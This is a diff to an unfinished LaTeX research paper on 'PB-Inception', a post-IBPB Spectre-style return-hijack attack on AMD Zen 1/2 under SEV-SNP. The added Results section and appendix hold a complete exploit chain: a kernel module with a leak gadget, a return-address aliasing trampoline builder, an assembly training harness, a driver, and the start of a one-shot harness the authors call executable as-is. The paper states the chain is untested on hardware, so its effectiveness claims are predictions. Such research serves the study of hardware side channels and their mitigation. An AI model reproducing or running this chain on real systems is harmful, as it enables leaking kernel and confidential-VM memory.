@@ -3,6 +3,8 @@
 \usepackage[T1]{fontenc}
 \usepackage{lmodern}
 \usepackage{microtype}
+\usepackage{pdflscape}   % rotates the *page* in the PDF viewer
+\usepackage{ragged2e}    % for \RaggedRight with proper hyphenation
 \usepackage{hyperref}
 % --- keep these once (order matters: hyperref near the end) ---
 \usepackage{booktabs,tabularx,array}
@@ -277,10 +279,459 @@ Due to a lack of required hardware, we did not conduct empirical measurements fo
   \footnotesize\emph{Note.} PSU, chassis, storage, cooling, and a measurement host for Flush+Reload on the shared buffer are assumed but not itemized.
 \end{table}
 
-
 \section{Results and Discussion}
+\label{sec:results}
+
+\subsection{What the PoC establishes}
+Our PoC demonstrates a \emph{constructive} post-IBPB Spectre primitive on AMD Zen~1(+)/2: return-target predictions mistrained in user mode survive a subsequent IBPB and speculatively steer the first \texttt{ret} in the kernel entry path into an attacker-chosen kernel gadget. The gadget encodes one secret byte per invocation into a 1\,MiB probe buffer with a one-hot cache footprint at offset \texttt{val $\ll$ 12}. Although we defer on-hardware measurements, the complete code path, control toggles, and covert-channel design constitute a falsifiable exploitation recipe whose predicted observables are listed below. This section reports component-level correctness, expected end-to-end behaviour and negative controls, based on the artifacts detailed in \S\ref{sec:method:pb-inception:overview}--\S\ref{sec:method:pb-inception:controls}.\cite{wikner2025breaking,trujillo2023inception,linux_srso_doc,linux_rsb_doc}
+
+\subsection{Component-level results (static/constructive)}
+\paragraph{Kernel DC leak gadget (LKM).}
+The loadable kernel module exports \texttt{pbinc\_dc\_gadget()} and wires three sysfs controls under \texttt{/sys/kernel/pbinc/}: (i) \texttt{probe} to pass the guest-physical base of a shared 1\,MiB probe (ioremapped cached), (ii) \texttt{leak} to set the victim kernel VA, and (iii) \texttt{gaddr} to disclose the gadget VA for alias matching. The gadget performs \texttt{val = *leak\_source\_va; writeb(1, probe\_kva + (val << 12));}, creating a strong Flush+Reload signal while keeping the architectural path benign. This module is minimal by design and cleanly unloads/unmaps on exit.\cite{wikner2025breaking,linux_srso_doc}
+
+\begin{lstlisting}[language=C, caption={PB‑Inception kernel gadget (LKM): sysfs plumbing (\texttt{probe}, \texttt{leak}, \texttt{gaddr}), mapping of a 1\,MiB shared probe via \texttt{ioremap\_cache()}, and \texttt{pbinc\_dc\_gadget()} which transiently reads one kernel byte and encodes it at offset \texttt{(val << 12)}.}, label={lst:pbinc-gadget}]
+#include <linux/module.h>
+#include <linux/io.h>
+#include <linux/sysfs.h>
+
+#define PROBE_SIZE (4096 * 256)
+
+// Mapped kernel VA of the SHARED buffer (mapped via ioremap_cache())
+static void __iomem *probe_kva = NULL;
+
+// Physical address of the SHARED buffer (set by user via sysfs)
+static phys_addr_t probe_pa = 0;
+
+// Kernel virtual address to read the leaked byte from (set via sysfs)
+static void *leak_source_va = NULL;
+
+// PB-Inception Data Cache (DC) Gadget
+// Speculatively executed via mispredicted RET
+// Loads 1 byte from kernel address (leak_source_va) and
+// encodes it into the SHARED probe buffer at [val << 12]
+noinline notrace void pbinc_dc_gadget(void)
+{
+    if (!probe_kva || !leak_source_va)
+        return;
+    
+    // Load the secret byte (must be mapped and readable)
+    u8 val = *(volatile u8 *)leak_source_va;
+    
+    // Encode it into the SHARED probe buffer at offset: val * 4096
+    writeb(1, probe_kva + ((size_t)val << 12));
+}
+EXPORT_SYMBOL_GPL(pbinc_dc_gadget); // Make the gadget address visible via kallsyms/sysfs
+
+// Sets the physical address of the 1 MiB SHARED buffer
+// Maps it with ioremap_cache() so the gadget can access it
+static ssize_t probe_pa_store(struct kobject *kobj, struct kobj_attribute *attr,
+                              const char *buf, size_t count)
+{
+    kstrtoull(buf, 0, &probe_pa);
+    
+    // Unmap old region if previously mapped
+    if (probe_kva) iounmap(probe_kva);
+
+    // Map the shared physical buffer into kernel VA space
+    probe_kva = ioremap_cache(probe_pa, PROBE_SIZE);
+    return count;
+}
+
+// Sets the virtual address inside the kernel to leak from
+// The gadget will read 1 byte from this address transiently
+static ssize_t leak_va_store(struct kobject *kobj, struct kobj_attribute *attr,
+                             const char *buf, size_t count)
+{
+    unsigned long tmp;
+    kstrtoul(buf, 0, &tmp);
+    leak_source_va = (void *)tmp;
+    return count;
+}
+
+// Returns the virtual address of pbinc_dc_gadget()
+// Userland uses this to match low bits for return predictor aliasing
+static ssize_t gaddr_show(struct kobject *kobj, struct kobj_attribute *attr, char *buf)
+{
+    return sprintf(buf, "%px\\n", pbinc_dc_gadget);
+}
+
+// Each entry connects a sysfs file to a store/show function
+static struct kobj_attribute attr_probe_pa = __ATTR(probe, 0200, NULL, probe_pa_store);
+static struct kobj_attribute attr_leak_va  = __ATTR(leak,  0200, NULL, leak_va_store);
+static struct kobj_attribute attr_gaddr    = __ATTR(gaddr, 0444, gaddr_show, NULL);
+
+// Group of sysfs attributes under /sys/kernel/pbinc/
+static struct attribute *attrs[] = {
+    &attr_probe_pa.attr,
+    &attr_leak_va.attr,
+    &attr_gaddr.attr,
+    NULL,
+};
+
+// Module cleanup: unmap shared memory and remove sysfs files
+static const struct attribute_group attr_group = {
+    .attrs = attrs,
+};
+
+static struct kobject *kobj;
+
+static int __init pbinc_init(void)
+{
+    kobj = kobject_create_and_add("pbinc", kernel_kobj);
+    return sysfs_create_group(kobj, &attr_group);
+}
+
+static void __exit pbinc_exit(void)
+{
+    if (probe_kva) iounmap(probe_kva);
+    kobject_put(kobj);
+}
+
+module_init(pbinc_init);
+module_exit(pbinc_exit);
+MODULE_LICENSE("GPL");
+\end{lstlisting}
+
+\paragraph{Return-address aliasing trampolines.}
+User space JIT-builds 64 (\texttt{TRAMP\_COUNT}) RX trampolines whose \emph{return addresses} (RAs) share a low-bit alias class with the gadget VA (\texttt{ALIAS\_MASK = 0xFFFFF}). For each candidate stub, we accept only if \((\texttt{RA} \,\&\, \texttt{ALIAS\_MASK}) = (\texttt{gaddr} \,\&\, \texttt{ALIAS\_MASK})\). When executed transiently, calls to these stubs push colliding RAs and bias the return predictor toward the gadget. The builder aborts if it cannot populate all 64 entries, ensuring deterministic setup.\cite{wikner2022retbleed,trujillo2023inception,wikner2023phantom}
+
+\begin{lstlisting}[language=C, caption={Return‑address aliasing trampoline builder: JIT‑creates RX call stubs whose return addresses share \texttt{ALIAS\_MASK} with the kernel gadget, populating \texttt{\_\_alias\_tbl[]} to bias the return predictor for the TTE cascade.}, label={lst:pbinc-tramp}]
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <errno.h>
+
+// Trampoline because: A small piece of code whose only purpose
+// is to jump or call into another piece of code -> often while
+// managing control flow
+
+// Total number of desired trampolines for return-predictor pressure
+#define TRAMPOLINE_COUNT ${TRAMP_COUNT}
+
+// Max number of slots we'll scan to find alias-matching trampolines
+#define MAX_SEARCH_ATTEMPTS 4096
+
+// System page size (used to calculate region allocation)
+#define PAGE_SIZE 4096
+
+// Size of memory to mmap for trampoline stubs
+#define REGION_SIZE (PAGE_SIZE * MAX_SEARCH_ATTEMPTS)
+
+// x86 opcodes
+#define RET_OPCODE 0xC3   // ret
+#define CALL_OPCODE 0xE8  // call rel32
+
+// Externals patched/shared across PoC
+extern uint64_t __pbinc_kernel_gadget_addr;    // Kernel gadget VA
+extern uint64_t __alias_tbl[TRAMPOLINE_COUNT]; // Trampoline callsite entry points
+
+// Allow override of alias mask (used to match gadget RA bits)
+#ifndef ALIAS_MASK
+#define ALIAS_MASK ${ALIAS_MASK}UL // Mask used to match low bits of return address
+#endif
+
+////////////////////////////////////////////////////////////////////////////////
+// Builds a set of trampolines (CALLSITE stubs) where the return address
+// (i.e. the address after the CALL) falls in the same predictor class
+// as the kernel gadget. This is the key to PB-Inception predictor pressure.
+////////////////////////////////////////////////////////////////////////////////
+void *pbinc_create_trampolines(uint64_t gadget_addr) {
+    // Allocate RWX memory region for executable trampolines
+    uint8_t *region = mmap(NULL, REGION_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC,
+                           MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    if (region == MAP_FAILED) {
+        perror("mmap"); exit(1); // Bail if mapping fails
+    }
+
+    int found = 0; // Track how many aliasing trampolines we found
+    for (int i = 0; i < REGION_SIZE - 16 && found < TRAMPOLINE_COUNT; i += 64) {
+        uint8_t *tramp = region + i;
+
+        // Compute return address after the call instruction (i.e. target of first RET)
+        uint64_t ra = (uint64_t)(tramp + 5);                    // return address after CALL
+        
+        ////////////////////////////////////////////////////////////////////////////////
+        // Return address (RA) = address immediately after the CALL
+        // This is the address the CPU will speculate toward when a RET occurs
+        //
+        // The return predictor (e.g., RSB or BTB) doesn't use full 64-bit VAs.
+        // Instead, it indexes using a hash or the low N bits (-> 12-20 bits).
+        //
+        // The goal is to make RA collide with the kernel gadget's predictor slot,
+        // so that speculative RETs in the kernel (post-IBPB) will transiently
+        // jump to the gadget -> even though architecturally they shouldn't.
+        //
+        // Therefore, we apply an ALIAS_MASK to both:
+        // ra & ALIAS_MASK -> the return address from the trampoline
+        // gadget_addr & ALIAS_MASK -> the address of our kernel gadget
+        //
+        // If they match: the predictor learns that return addresses in this
+        // index class are likely -> this builds pressure toward the gadget.
+        //
+        // If they don't match: skip this candidate.
+        ////////////////////////////////////////////////////////////////////////////////
+
+        if ((ra & ALIAS_MASK) != (gadget_addr & ALIAS_MASK))
+            continue;
+
+        tramp[0] = CALL_OPCODE;       // call rel32 (relative target -> 32-bit signed offset) -> ret_stub @ +6
+        *(int32_t *)(tramp + 1) = (int32_t)((tramp + 6) - (tramp + 5)); // Calculate rel32 offset for call
+        tramp[5] = RET_OPCODE;        // First RET -> returns to RA (alias)
+        tramp[6] = RET_OPCODE;        // ret_stub: return to next alias
+        tramp[7] = RET_OPCODE;        //Optional RET padding (safe NOP)
+
+        __alias_tbl[found++] = (uint64_t)tramp;   // Save entry point into alias table
+    }
+
+    // If we couldn't build enough valid trampolines, exit
+    if (found < TRAMPOLINE_COUNT) {
+        fprintf(stderr, "[-] Only %d/%d trampolines matched mask 0x%lx (gadget bits 0x%lx)\n",
+                found, TRAMPOLINE_COUNT, (unsigned long)ALIAS_MASK,
+                (unsigned long)(__pbinc_kernel_gadget_addr & ALIAS_MASK));
+        exit(1);
+    }
+    printf("[+] Built %d trampolines; alias mask 0x%lx\n", found, (unsigned long)ALIAS_MASK);
+    return region; // keep region mapped/executable
+}
+\end{lstlisting}
+
+\paragraph{Training-in-Transient-Execution (TTE) call cascade.}
+The assembly harness \texttt{pbinc\_entry} executes a forward skip, then a backward \texttt{JE} whose predicate is delayed by reading from \texttt{\_\_slow\_predicate\_ptr}. In the mispredicted path, it issues a loop of 64 \texttt{call} sites via \texttt{\_\_alias\_tbl[i]}; none of these calls retire architecturally. This strictly-transient cascade overflows and biases return prediction state without observable architectural side effects.\cite{trujillo2023inception}
+
+\begin{lstlisting}[language={[x86masm]Assembler}, caption={Training‑in‑Transient‑Execution harness (\texttt{pbinc\_entry}): a backward‑mispredicted \texttt{JE} opens a speculative window to issue 64 calls via \texttt{\_\_alias\_tbl}, then a \texttt{syscall} crosses the IBPB boundary and the thread parks in a spin loop.}, label={lst:pbinc-asm}]
+global pbinc_entry
+extern __pbinc_kernel_gadget_addr     ; From C driver: patched with KVA of kernel gadget
+extern __pbinc_probe_shared           ; From C driver: VA of shared probe buffer (1MB)
+extern __alias_tbl                    ; Runtime-patched: array of 64 callsite trampoline entry pointers
+extern __slow_predicate_ptr           ; Runtime: mapped slow memory (used to delay JE resolution)
+
+section .text
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Entry point for the PB-Inception userland training harness
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+pbinc_entry:
+    call pre_ibpb_transient_train   ;Run transient training before IBPB
+    mov  rax, 39                    ; getpid -> syscall entry (IBPB boundary)
+    syscall                         ; Cross IBPB boundary (causes entry-IBPB in guest)
+.spin:
+    pause                           ; Not kill threat -> inf loop -> keep-alive threat
+    jmp  .spin
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Pre-IBPB transient training block
+; - Uses a backward mispredicted JE to speculatively execute call cascade
+; - No call here retires (training must be transient-only)
+; => 64 calls -> return predictor pressure
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+pre_ibpb_transient_train:
+    jmp  .do_branch                ; Skip call cascade architecturally (forward jump)
+                                   ; Under normal (architectural) execution, the call cascade never runs
+                                   ; Means if the "normal" paths are taken it wouldnt run
+
+.speculative_call_cascade:
+    mov  rsi, [rel __alias_tbl]    ; Load pointer to trampoline entry array (call sites)
+    mov  ecx, 64                   ; Number of transient call targets
+.alias_loop:
+    call qword [rsi]               ; Speculative CALL -> pushes RA to stack -> biases return predictor
+    add  rsi, 8                    ; Trampolines are crafted to have return addresses that alias the kernel gadget
+    dec  ecx                       ; Advance to next entry in trampoline table
+    jnz  .alias_loop               ; Loop until all 64 calls are issued -> until z-flag not 0
+    ret
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Branch predicate that keeps JE unresolved long enough to execute the cascade
+; - Must not use lfence -> all memory loads before lfence must complete -> not speculatively run anymore
+; - The memory at __slow_predicate_ptr should be slow (uncached / fault-suppressed / mapped to delay)
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+.do_branch:
+    mov  rdx, [rel __slow_predicate_ptr]  ; runtime: slow mapped memory
+    mov  rax, [rdx]
+    cmp  rax, 0xdeadbeef
+    je   .speculative_call_cascade        ; backward Jcc (target above)
+    ret
+
+section .data
+__pbinc_kernel_gadget_addr: dq 0           ; Patched at runtime: VA of kernel gadget (used to derive alias class)
+__pbinc_probe_shared:       dq 0           ; Patched at runtime: guest VA of SHARED probe buffer (1 MiB)
+__alias_tbl:                times 64 dq 0  ; Table of 64 trampoline entry VAs (callsite-aligned, RA aliasing gadget)
+__slow_predicate_ptr:       dq 0           ; Points to mapped slow memory to delay JE resolution
+; Slow memory because: Because we want the CPU to speculate into the training block before it knows whether the branch
+; is actually taken or not.
+\end{lstlisting}
+
+\paragraph{Crossing IBPB and hijacking the first return.}
+A subsequent \texttt{syscall} (\texttt{getpid}) causes the kernel to execute \texttt{entry\_ibpb} (wrmsr to IBPB) early in the entry path. On Zen~1/2, return-target predictions persist across IBPB, so the first post-IBPB \texttt{ret} speculates to \texttt{pbinc\_dc\_gadget} before normal control flow is recovered. The harness targets an early \texttt{ret}, increasing stability and channel strength.\cite{wikner2025breaking,amd_srso_whitepaper,linux_srso_doc}
+
+\paragraph{Covert channel and measurement.}
+The probe buffer is guest-mapped but backed by guest-physical pages with C-bit cleared (C-bit=0) and ioremapped cached in the kernel. Each leaked byte heats exactly one 4\,KiB page at offset \texttt{val $\ll$ 12}. A host or helper thread can recover the symbol via Flush+Reload over the 256-page probe, while the victim code and other kernel data remain encrypted at rest under SEV-SNP.\cite{linux_srso_doc}
+
+\subsection{Expected end-to-end behaviour}
+With \texttt{TRAMP\_COUNT}=64 and a correctly tuned \texttt{ALIAS\_MASK}, a single user$\rightarrow$kernel transition is sufficient to speculatively execute the gadget and encode one byte per event. The predicted measurement is a unimodal latency minimum on exactly one probe page matching the secret byte. Perf-level telemetry during active runs should show elevated branch misses and machine clears compared to an idle baseline. All of these predictions follow directly from the code paths and the attacker-controlled timing of the transient window.\cite{wikner2025breaking}
+
+\begin{landscape}
+\begin{table}[p]
+  \centering
+  \caption{A/B validation matrix: each toggle isolates a necessary precondition.}
+  \label{tab:controls}
+  \setlength{\tabcolsep}{8pt}
+  \renewcommand{\arraystretch}{1.15}
+  % l l l = three compact columns; last column wraps (\RaggedRight X)
+  \begin{tabularx}{\linewidth}{@{} l l l >{\RaggedRight\arraybackslash}X @{}}
+    \toprule
+    \textbf{Toggle} & \textbf{Setting A} & \textbf{Setting B} & \textbf{Expected observation} \\
+    \midrule
+    IBPB/RSB on entry   & IBPB-on-entry, no RSB stuffing & IBPB + full RSB stuffing &
+      Signal present in A; vanishes in B. \\
+    Gadget availability & \texttt{pbinc\_dc\_gadget} loaded & LKM unloaded or \texttt{leak} unmapped &
+      Signal present in A; no hits in B. \\
+    Aliasing pressure   & 64 aliasing trampolines & Zero trampolines / random mask &
+      No hijack in B; page hits disappear. \\
+    Microarchitecture   & AMD Zen~1/2 (Fam.~17h) & Non-Zen~1/2 AMD or Intel &
+      Negative on B (as designed). \\
+    CC mapping          & Probe C-bit=0 (shared) & Probe encrypted (C-bit=1) &
+      Host-side Flush+Reload works only in A. \\
+    \bottomrule
+  \end{tabularx}
+\end{table}
+\end{landscape}
+
+
+\vspace{-0.5em}
+
+\subsection{Fully glued one-shot PoC (artifact overview)}
+For reproducibility and easy migration to the appendix, we summarise the end-to-end harness:
+
+\begin{enumerate}
+  \item \textbf{Preflight.} Toolchain sanity, vendor/family checks, mitigation telemetry, ensure \texttt{kptr\_restrict=0} to read \texttt{gaddr}.\cite{linux_srso_doc}
+  \item \textbf{Build+load LKM.} Compile and \texttt{insmod} the kernel module, this creates\\ \texttt{/sys/kernel/pbinc/\{probe,leak,gaddr\}}.\cite{wikner2025breaking}
+  \item \textbf{Prepare shared probe.} Allocate a 1\,MiB GPA with C-bit=0 and write it to \texttt{/sys/kernel/pbinc/probe}, record \texttt{gaddr}.\cite{wikner2025breaking}
+  \item \textbf{Build user binary.} Assemble \texttt{pbinc.asm}, compile \texttt{trampoline.c} (RA-alias builder) and \texttt{driver.c} (wires sysfs $\rightarrow$ ASM), link \texttt{pbinc\_poc}.\cite{wikner2025breaking}
+  \item \textbf{Run.} Launch \texttt{pbinc\_poc} pinned to one core with the GVA of the same shared probe, the process executes TTE training $\rightarrow$ \texttt{syscall} (IBPB) $\rightarrow$ spin. Host/helper performs Flush+Reload over 256 pages to recover \texttt{val}.\cite{wikner2025breaking}
+\end{enumerate}
+
+\subsection{Negative results, failure modes, and robustness}
+\emph{Aliasing miss.} If \texttt{ALIAS\_MASK} is poorly chosen or insufficient trampolines are found, the bias toward the gadget collapses; our builder aborts when it cannot fill 64 entries.  
+\emph{Mitigation interference.} RSB stuffing on entry or removal of early \texttt{ret} sites defeats the primitive by clearing or bypassing the poisoned state.  
+\emph{CC plumbing errors.} If the probe is encrypted (C-bit=1), host-observable Flush+Reload fails even though intra-core speculation still occurs, the mitigation appears indistinguishable from a negative microarchitectural result without local timing.  
+\emph{Noise sources.} Competing activity on the same core, TLB shootdowns, and unrelated I-cache fills reduce the transient window, pinning and isolating the core stabilise outcomes. All of these behaviours are anticipated by the harness design and control toggles in \S\ref{sec:method:pb-inception:controls}.\cite{linux_srso_doc,linux_rsb_doc,wikner2025breaking}
+
+\subsection{Implications for confidential computing (SEV-SNP)}
+SEV-SNP ensures memory confidentiality/integrity at rest and in transit, it does not preclude in-core transient execution on decrypted lines. Our PoC respects the CC threat model (no architectural compromise, no key disclosure) yet still exfiltrates one byte per entry by writing into a deliberately shared (unencrypted) buffer. Consequently, CC deployments that depend solely on IBPB-on-entry on Zen~1/2 remain vulnerable to PB-Inception unless they add RSB sanitisation or remove early returns on kernel entry. The result is consistent with our methodology and artifact semantics in \S\ref{sec:method:pb-inception:cc}.\cite{wikner2025breaking,linux_srso_doc}
+
+\subsection{Summary}
+Even without hardware measurements, the PoC provides a complete, auditable chain from predictor poisoning (TTE) through a post-IBPB return hijack to a high-SNR cache channel, together with A/B controls that make the mechanism falsifiable. The security implication is sharp: on Zen~1/2, IBPB-on-entry alone is insufficient software must also sanitise return prediction state on privilege transitions or remove susceptible early returns. These statements follow directly from the code paths and the end-to-end harness described here and in \S\ref{sec:method:pb-inception:overview}--\S\ref{sec:method:pb-inception:controls}.\cite{wikner2025breaking,trujillo2023inception,linux_srso_doc,linux_rsb_doc}
+
+\section{Future Work}
 ToDo
-\begin{lstlisting}[language=bash, alsolanguage=C]
+
+
+\section{Conclusion}
+ToDo
+
+\bibliography{refs}
+
+\section{Attachment}
+This appendix provides the two user‑space artifacts that “glue” the PoC together. 
+Listing~\ref{lst:driver} is the minimal driver that wires sysfs $\rightarrow$ 
+trampoline builder $\rightarrow$ ASM entry. It (i) pins the process for stability, 
+(ii) reads the kernel gadget VA from \texttt{/sys/kernel/pbinc/gaddr}, 
+(iii) builds aliasing trampolines and provisions the slow predicate buffer, and 
+(iv) invokes \texttt{pbinc\_entry()} to trigger the entry–IBPB transition.
+
+Listing~\ref{lst:fullpoc} is the one‑shot harness that reproduces the full setup: 
+it builds/loads the kernel gadget LKM, compiles the user components (ASM, trampoline 
+builder, driver), wires sysfs, and launches the PoC pinned to a core. This listing is 
+intended to be executable as‑is on a suitable AMD Zen~1/2 platform under the conditions 
+outlined in the methodology and controls sections.
+
+\begin{lstlisting}[language=C,caption={User-space driver for PB-Inception: wires sysfs, builds aliasing trampolines, provisions slow predicate, and triggers the IBPB boundary via \texttt{pbinc\_entry()}.},label={lst:driver}]
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <sched.h> // For CPU pinning
+#include <unistd.h>
+#include <errno.h>
+
+#define TRAMPOLINE_COUNT 64 // Number of speculative callsite trampolines
+
+// Extern symbols from the ASM file and trampoline builder
+extern uint64_t __pbinc_kernel_gadget_addr;    // Kernel gadget VA (to alias against)
+extern uint64_t __pbinc_probe_shared;          // SHARED (C-bit=0) buffer (host-observable)
+extern uint64_t __alias_tbl[TRAMPOLINE_COUNT]; // Callsite trampoline table (filled at runtime)
+extern uint64_t __slow_predicate_ptr;          // Cold memory to delay branch resolution
+
+// Provided by trampoline.c -> builds the aliasing callsite trampolines
+void *pbinc_create_trampolines(uint64_t gadget_addr);
+
+// Provided by pbinc.asm -> the speculative training -> syscall -> spin harness
+void pbinc_entry(void);
+
+// Reads a hex value from a sysfs-style file (e.g. /sys/kernel/pbinc/gaddr)
+static uint64_t read_hex(const char *path) {
+    FILE *f = fopen(path, "r");
+    if (!f) { 
+        perror(path); exit(1); // Abort if file can't be opened
+    }
+    unsigned long long x = 0;
+    if (fscanf(f, "%llx", &x) != 1) {
+        fprintf(stderr, "parse %s failed\n", path); exit(1); // Failed to parse hex
+    }
+    fclose(f);
+    return x; // Return parsed 64-bit value
+}
+
+int main(int argc, char **argv) {
+    if (argc < 2) {
+        // Expect SHARED buffer guest-virtual address (GVA) as argument
+        fprintf(stderr, "usage: %s <guest-VA-of-SHARED-probe-hex>\n", argv[0]);
+        return 2;
+    }
+
+    ////////////////////////////////////////////
+    // 1. Pin to specific CPU core -> stability
+    ////////////////////////////////////////////
+    cpu_set_t set; CPU_ZERO(&set); CPU_SET(0, &set);
+    sched_setaffinity(0, sizeof(set), &set); // Enforce CPU affinity for PoC repeatability
+
+    ////////////////////////////////////////////
+    // 2. Patch runtime addresses from sysfs / CLI
+    ////////////////////////////////////////////
+    // Load kernel gadget virtual address from module sysfs (e.g. /sys/kernel/pbinc/gaddr)
+    __pbinc_kernel_gadget_addr = read_hex("/sys/kernel/pbinc/gaddr");
+
+    // Parse GVA of shared probe from command-line
+    __pbinc_probe_shared = strtoull(argv[1], NULL, 16);
+
+    ////////////////////////////////////////////
+    // 3. Build CALLSITE trampolines that alias the kernel gadget
+    ////////////////////////////////////////////
+    // This fills __alias_tbl[] with entry points to hand-crafted callsite stubs (trampoline calls)
+    // Each one has a return address that collides with the kernel gadget's class
+    (void)pbinc_create_trampolines(__pbinc_kernel_gadget_addr);
+
+    ////////////////////////////////////////////
+    // 4. Allocate lab-only memory to act as a cold read for delayed branch resolution
+    ////////////////////////////////////////////
+    // The address will be read from inside the ".do_branch" block in pbinc.asm
+    // It must be slow (ideally cold L3 or fault-suppressed) to prolong speculative window
+    void *slow = aligned_alloc(4096, 4096); // Aligned for page granularity
+    if (!slow) { perror("alloc slow"); exit(1); }
+    __slow_predicate_ptr = (uint64_t)slow; // Patch the ASM-visible symbol
+
+    ////////////////////////////////////////////
+    // 5. Jump into ASM:
+    // [1] Transiently train -> [2] Syscall (IBPB) -> [3] Spin loop
+    ////////////////////////////////////////////
+    pbinc_entry(); // This does not return
+    return 0;
+}
+\end{lstlisting}
+
+\begin{lstlisting}[style=bash-nonitalic,language=bash,alsolanguage=C,caption={Full one-shot PB‑Inception harness: builds and loads the kernel gadget, compiles user-space (ASM, trampoline builder, driver), wires sysfs, and launches the PoC pinned to one core.},label={lst:fullpoc}]
 #!/usr/bin/env bash
 # PB-Inception (Post-IBPB) Measurement Harness -> Full Exploit Version
 # -----------------------------------------------------------------------------
@@ -775,13 +1226,4 @@ EONOTE
 
 # EOF
 \end{lstlisting}
-
-\section{Future Work}
-ToDo
-
-
-\section{Conclusion}
-ToDo
-
-\bibliography{refs}
 \end{document}
